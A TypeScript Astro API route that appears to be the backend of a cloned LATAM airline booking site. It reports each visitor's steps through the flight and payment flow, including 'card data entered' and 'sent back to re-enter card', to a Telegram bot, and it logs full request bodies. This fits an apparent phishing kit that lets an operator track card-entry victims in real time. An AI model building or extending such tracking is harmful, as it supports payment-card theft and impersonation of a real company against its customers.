export const prerender = false;

import type { APIRoute } from 'astro';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';

const PAGE_EVENTS = [
  'Buscando vuelos',
  'Eligiendo vuelo de ida',
  'Eligiendo vuelo de vuelta',
  'Viendo resumen de vuelos',
  'Escogiendo asiento ida',
  'Escogiendo asientos vuelta',
  'Escogiendo maletas',
  'Datos de pasajero',
  'Pagina de pago',
  'Abrio banner de pago',
  '✅ Ingreso datos cc',
  'Devuelta a ingresar tarjeta',
  'Compra exitosa',
] as const;

type PageDebugEvent = (typeof PAGE_EVENTS)[number];

const REPEAT_EVENTS = new Set<string>([
  'Devuelta a ingresar tarjeta',
  '✅ Ingreso datos cc',
]);

const recentEvents = (globalThis as typeof globalThis & {
  __latamPageEventAt?: Map<string, number>;
}).__latamPageEventAt ?? new Map<string, number>();
(globalThis as typeof globalThis & { __latamPageEventAt?: Map<string, number> }).__latamPageEventAt = recentEvents;

function requestIp(request: Request) {
  const forwarded = request.headers.get('x-forwarded-for') || '';
  return (
    forwarded.split(',')[0]?.trim()
    || request.headers.get('x-real-ip')
    || request.headers.get('x-vercel-forwarded-for')
    || 'unknown'
  );
}

function takeEventSlot(ip: string, event: string) {
  const key = `${ip}|${event}`;
  const now = Date.now();
  const last = recentEvents.get(key) || 0;
  if (now - last < 20000) return false;
  recentEvents.set(key, now);
  return true;
}

function json(data: unknown, init: ResponseInit = {}) {
  return new Response(JSON.stringify(data), {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
      ...init.headers,
    },
  });
}

function telegramConfig() {
  return {
    token: TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '',
  };
}

async function telegramApi(method: string, payload: Record<string, unknown>) {
  const { token } = telegramConfig();
  if (!token) return { ok: false, skipped: 'telegram-env-missing' as const };
  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  let description = '';
  try {
    const data = (await response.json()) as { description?: string };
    description = String(data?.description || '');
  } catch {
    /* ignore */
  }
  return { ok: response.ok, status: response.status, description };
}

async function sendPageEvent(event: PageDebugEvent) {
  const { token, chatId } = telegramConfig();
  if (!token || !chatId) return { sent: false, skipped: 'telegram-env-missing' };
  const result = await telegramApi('sendMessage', {
    chat_id: chatId,
    text: event,
    disable_web_page_preview: true,
  });
  if (result.skipped) return { sent: false, skipped: result.skipped };
  return result.ok
    ? { sent: true }
    : { sent: false, error: result.description || `telegram-${result.status || 'unknown'}` };
}

export const GET: APIRoute = async () => {
  const { token, chatId } = telegramConfig();
  return json({ configured: Boolean(token && chatId) });
};

export const POST: APIRoute = async ({ request }) => {
  let body: Record<string, unknown> = {};
  try {
    body = await request.json();
  } catch {
    return json({ error: 'JSON invalido' }, { status: 400 });
  }

  const event = String(body.event || '') as PageDebugEvent;
  if (!PAGE_EVENTS.includes(event)) return json({ error: 'Evento page debug invalido' }, { status: 400 });

  if (!REPEAT_EVENTS.has(event) && !takeEventSlot(requestIp(request), event)) {
    return json({ event, telegram: { sent: false, skipped: 'deduped' } });
  }

  console.info('[debug-page-api:body]', body);
  const telegram = await sendPageEvent(event);
  return json({ event, telegram });
};
